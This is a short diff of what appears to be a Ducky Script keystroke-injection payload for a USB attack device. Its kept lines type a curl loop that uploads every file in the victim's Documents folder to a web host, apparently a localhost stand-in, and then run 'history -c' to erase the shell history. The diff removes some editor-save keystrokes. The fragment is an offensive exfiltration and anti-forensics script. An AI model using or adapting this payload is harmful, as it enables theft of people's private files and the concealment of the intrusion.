@@ -12,12 +12,6 @@ ENTER
 STRING for f in Documents/*;do curl -F file=@$f http://127.0.0.1:80/;done
 DELAY 200
 ENTER 
-CTRL x
-DELAY 200
-ENTER
-STRING Y
-DELAY 200
-ENTER
 STRING history -c
 DELAY 200
 ENTER
